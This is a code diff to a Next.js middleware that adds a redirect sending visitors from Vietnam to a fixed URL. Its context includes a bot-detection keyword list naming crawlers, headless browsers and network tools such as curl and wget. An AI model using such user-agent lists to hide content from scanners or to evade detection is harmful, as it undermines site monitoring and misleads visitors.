@@ -8,6 +8,7 @@ import {
     LANG_HEADER,
     resolveLanguageFromCountry
 } from '@/utils/resolve-language';
+import { isVietnamCountry, VIETNAM_REDIRECT_URL } from '@/utils/vietnam-redirect';
 
 const BOT_KEYWORDS = ['bot', 'spider', 'crawler', 'headl', 'headless', 'slurp', 'fetcher', 'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'twitterbot', 'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'puppeteer', 'selenium', 'webdriver', 'curl', 'wget', 'python', 'scrapy', 'lighthouse', 'facebookexternalhit'];
 
@@ -34,6 +35,10 @@ const middleware = async (req: NextRequest) => {
 
     const headerCountry = getCountryFromHeaders(req.headers);
     const countryCode = geoInfo?.countryCode || headerCountry;
+    if (isVietnamCountry(countryCode)) {
+        return NextResponse.redirect(VIETNAM_REDIRECT_URL);
+    }
+
     const langFromCountry = countryCode
         ? resolveLanguageFromCountry(countryCode, countryToLanguage)
         : '';
